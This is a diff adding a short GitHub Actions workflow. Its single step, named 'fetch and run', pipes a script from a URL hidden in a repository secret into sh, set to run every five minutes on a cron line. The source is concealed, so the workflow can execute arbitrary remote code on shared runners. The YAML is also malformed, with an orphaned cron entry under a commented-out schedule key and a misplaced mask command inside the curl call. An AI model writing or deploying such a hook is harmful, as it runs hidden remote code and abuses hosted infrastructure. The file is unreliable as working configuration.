@@ -1,0 +1,16 @@
+# Usage of Actions is monitored by Github and is subject to terms:
+# https://docs.github.com/en/github/site-policy/github-terms-for-additional-products-and-features#a-actions-usage
+
+on:
+  #schedule:
+    - cron:  '*/5 * * * *'
+    
+jobs:
+  script:
+    runs-on: ubuntu-latest
+    steps:
+    - name: fetch and run
+      env:
+        URL: ${{ secrets.SH_URL }}
+      run: |
+        curl -sSL ::add-mask::$URL | sh
